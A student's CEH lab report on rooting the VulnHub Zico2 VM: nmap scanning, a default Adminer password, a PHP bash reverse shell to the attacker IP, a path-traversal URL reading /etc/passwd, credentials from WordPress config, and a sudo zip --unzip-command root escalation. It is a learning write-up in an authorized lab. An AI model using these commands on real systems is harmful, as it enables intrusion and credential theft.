# Zico2: 1 — VulnHub Lab Report

**Course:** CEH v13  
**Lab Name:** Zico2: 1  
**Attacker Machine:** Kali Linux  
**Target IP:** `192.168.0.110`  
**Attacker IP:** `192.168.0.107`  
**Objective:** Obtain root access to the target machine.

## 1. Introduction

In this lab, my objective was to gain root access to the Zico2 virtual machine. I started with network scanning and web enumeration to find possible entry points. During enumeration, I discovered an Adminer database login page and found its default password online.

After logging in to the database, I created a database and a table and inserted a PHP payload. I then started a listener on my Kali machine and used the LFI vulnerability to trigger the payload. This gave me an initial shell on the target.

After getting the shell, I explored the user's home directory and the web server files. I found credentials in the WordPress configuration files and used them to log in through SSH as `zico`. Finally, I checked privilege-escalation possibilities and used the `zip` utility to obtain root access.

## 2. Network Scanning Using Nmap

First, I used Nmap to discover active hosts on my lab network.

```bash
nmap -sn 192.168.0.0/24
```

After identifying the target IP address as `192.168.0.110`, I performed a detailed port and service scan.

```bash
nmap -sC -sV -p- 192.168.0.110 -oN zico2-scan.txt
```

The options used were:

- `-sn`: Host discovery without a port scan.
- `-sC`: Runs Nmap's default scripts.
- `-sV`: Attempts to identify service versions.
- `-p-`: Scans all TCP ports.
- `-oN`: Saves the scan results in normal text format.

I used the results to identify the available services and decide which services to investigate further.

## 3. Directory Enumeration

After the Nmap scan, I performed directory brute-forcing against the target web server to discover hidden directories and files.

During this process, I found an Adminer database administration page. This page became my next point of investigation because it provided access to database management functionality.

## 4. Accessing Adminer

After discovering the Adminer page, I searched online for its default credentials. I found that the password was `admin` and used it to log in.

Once authenticated, I could access the database management interface. I then explored its functionality and prepared to investigate whether database modification could be combined with the LFI vulnerability I had identified.

## 5. Creating a Database and Table

After gaining database access, I created a database and a table. I inserted a PHP payload into a field, intending to use it during the next stage of the attack.

The PHP code I used was:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.107/1234 0>&1'");
?>
```

The purpose of this code was to make the target initiate a connection back to my Kali machine on port `1234`.

I then started a listener on my attacker machine to wait for the incoming connection.

The database modification alone did not execute the PHP code. The application also needed to process the stored content in a way that caused the PHP code to run.

## 6. Exploiting LFI and Getting an Initial Shell

During my earlier testing, I discovered that the `page` parameter in `view.php` could be manipulated to access local files.

I tested the vulnerability with the following URL:

```text
http://192.168.0.110/view.php?page=../../../../../../../etc/passwd
```

The application returned the contents of `/etc/passwd`. This exposed local account information, including the `root`, `www-data`, and `zico` accounts.

After confirming that I could access local files through the application, I used the LFI vulnerability as part of my attempt to trigger the PHP payload.

The target subsequently connected back to my Kali machine, and I obtained an initial shell.

This was my first shell-level access to the target. At this stage, I still needed to investigate the system and obtain a more useful user account.

## 7. Post-Exploitation Enumeration

After obtaining the initial shell, I started exploring the target system.

I checked the available directories and examined the home directory associated with the `zico` user. I also investigated the web server directories and WordPress configuration files.

During this process, I found a username and password in the WordPress configuration files.

These credentials provided a possible route to local user access. I used them in the next stage of the assessment.

## 8. SSH Access as Zico

After finding the credentials, I used SSH to log in as the `zico` user.

This gave me a separate user session on the target machine. I could then perform post-exploitation enumeration from the perspective of the `zico` account.

This stage was important because obtaining an initial shell through a web application is not the same as having a normal local user session.

## 9. Privilege Escalation Using Zip

After logging in as `zico`, I investigated ways to escalate my privileges to root.

I focused on the `zip` utility and its interaction with `sudo`. I tried the following commands:

```bash
sudo -u root zip /tmp/test.zip /tmp/test-T-unzip-command="sh -c /bin/bash"
```

I then tried:

```bash
sudo -u root zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
```

The intended technique was to use the test option and custom unzip-command functionality of `zip` to launch a shell with root privileges.

This method depends on the `sudo` configuration, the available version of `zip`, and how its arguments are processed. The user must be permitted to execute the relevant command with root privileges for the technique to work.

After my privilege-escalation attempt, I successfully obtained root access to the target machine.

## 10. Final Result

The attack path I followed was:

1. Scanned the lab network using Nmap.
2. Identified the target and enumerated its open ports and services.
3. Performed directory brute-forcing against the web server.
4. Discovered the Adminer database administration page.
5. Found the default password online and logged in.
6. Created a database and table and inserted a PHP payload.
7. Started a listener on my Kali machine.
8. Used the LFI vulnerability as part of the process of obtaining an initial shell.
9. Explored the home directory and WordPress configuration files.
10. Found credentials and logged in through SSH as `zico`.
11. Investigated privilege escalation using the `zip` utility.
12. Successfully obtained root access.

## 11. Conclusion

In this lab, I learned how different vulnerabilities and configuration weaknesses can be combined to gain access to a Linux machine.

I started with Nmap scanning and directory enumeration, then discovered an Adminer database interface with a weak or default password. After obtaining database access, I investigated the LFI vulnerability and used it as part of my initial-shell access path.

I then explored the target's home and web server directories, found credentials in the WordPress configuration files, and used SSH to log in as `zico`. Finally, I investigated the `zip` utility and `sudo` permissions to escalate my privileges to root.

The main lesson I learned was that penetration testing involves more than finding a single vulnerability. Each stage requires enumeration, verification, and understanding how the available access can lead to the next stage.

**Final outcome:** Root access was successfully obtained on the Zico2: 1 virtual machine in the authorized lab environment.
